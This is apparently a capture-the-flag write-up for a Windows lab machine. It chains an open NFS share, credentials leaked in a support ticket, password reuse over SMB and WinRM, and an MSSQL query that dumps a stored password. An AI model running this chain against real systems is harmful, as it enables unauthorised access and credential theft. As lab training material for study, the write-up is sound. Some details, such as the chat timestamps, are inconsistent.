# Writeup: WINMEDIUM Machine (<TARGET_IP>)
---

#############################################################################
## Reconnaissance

### 1. Port Scanning

```bash
nmap -sCV <TARGET_IP>
```

**Results:**
<pre>
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       Microsoft Windows RPC
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  SMB
2049/tcp open  nlockmgr      NFS
3389/tcp open  ms-wbt-server RDP
5985/tcp open  http          WinRM
</pre>

---

##############################################################################
## Initial Access - NFS Enumeration

### 1. DISCOVER NFS EXPORT

```bash
showmount -e <TARGET_IP>
```

**Result:**
```
Export list for <TARGET_IP>
/TechSupport (everyone)
```

### 2. MOUNT NFS SHARE

```bash
sudo mkdir -p /mnt/win_nfs
sudo mount -t nfs -o vers=3 <TARGET_IP>/TechSupport /mnt/win_nfs
sudo ls -la /mnt/win_nfs
```

**Result:**
<pre>
total 72
drwx-------- 2 4294967294 4294967294 65536 Aug 18 16:28 .
drwx-r-x-r-x 3 root       root         4096 Aug 18 16:37 ..
-rwx-------- 1 4294967294 4294967294     0 Nov 10  2021 ticket4238791283649.txt
-rwx-------- 1 4294967294 4294967294   1305 Nov 10  2021 ticket4238791283782.txt
</pre>

### 3. ANALYZE TICKET FILE

```bash
sudo cat /mnt/win_nfs/ticket4238791283782.txt
```

**Contents:**
```
Conversation with InlaneFreight Ltd
Started on November 10, 2021 at 01:27 PM London time GMT (+0000)
---
01:27 PM | Operator: Hello. So what brings you here today?
01:27 PM | alex: hello

01:27 PM | Operator: Hey alex! What do you need help with?
01:02 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:  PM | Operator: Of course
01:  PM | alex: here it is:
 
smtp {
    host=smtp.web.dev.inlanefreight.htb
    #port=25
    ssl=true
    user="alex"
    password="lol123!mD"
    from="alex.g@web.dev.inlanefreight.htb"
}
```

**Credentials Found:**
- *Username:* alex
- *Password:* lol123!mD

---

##############################################################################
## Privilege Escalation - SMB Access

### 1. TEST SMB CREDENTIALS

```bash
crackmapexec smb <TARGET_IP> -u alex -p 'lol123!mD' --shares
```

**Result:**
<pre>
SMB         <TARGET_IP>   445    WINMEDIUM        [+] WINMEDIUM\alex:lol123!mD \
SMB         <TARGET_IP>   445    WINMEDIUM        devshare        READ,WRITE\
SMB         <TARGET_IP>   445    WINMEDIUM        Users           READ...
</pre>

### 2. ENUMERATE DEVSHARE

```bash
smbclient //<TARGET_IP>/devshare -U alex -p 'lol123!mD'
```

**Result:**
<pre>
smb: \> ls
  .                                 D        0  Tue Aug 18 16:43:28 2026
  ..                                D        0  Tue Aug 18 16:43:28 2026
  important.txt                   A       16  Wed Nov 10 11:12:55 2021
</pre>

```bash
cat important.txt
```

**Result:**
sa:87N1ns@slls83

**Credentials Found:**
- *Username:* sa
- *Password:* 87N1ns@slls83

---

#############################################################################
## SQL Server Exploitation

### 1. INITIAL SQL ACCESS

```bash
crackmapexec winrm <TARGET_IP> -u administrator -p '87N1ns@slls83'
```

**Result:**
WINRM        <TARGET_IP>   5985   WINMEDIUM        [+] WINMEDIUM\administrator:87N1ns@slls83 (Pwn3d!)

```bash
evil-winrm -i <TARGET_IP> -u administrator -p '87N1ns@slls83'
```

### 2. SQL ENUMERATION

```powershell
# Check SQL Server
Get-Service | Where-Object {$.Name -like "*SQL*"}

	# Running: MSSQLSERVER

# Connect to SQL
sqlcmd -E -S localhost -Q "SELECT name FROM sys.databases"
```

**Result:**
<pre>
name
--------------------------------------------------------------------------------------------------------------------------------master
tempdb
model
msdb
accounts
</pre>

### 3. EXTRACT HTB CREDENTIALS

```powershell
# Check tables in accounts database
sqlcmd -E -S localhost -d accounts -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES"
```

**Result:**
<pre>
TABLE_NAME
devsacc
</pre>

```powershell
# Extract HTB credentials
sqlcmd -E -S localhost -d accounts -Q "SELECT * FROM devsacc WHERE name='HTB'"
```

**Result:**
<pre>
id          name                                           password
------------------------------------------------------------------------------------------------
         157 HTB                                        lnch7ehrdnpc4oAqVPK4ZWR
</pre>

---
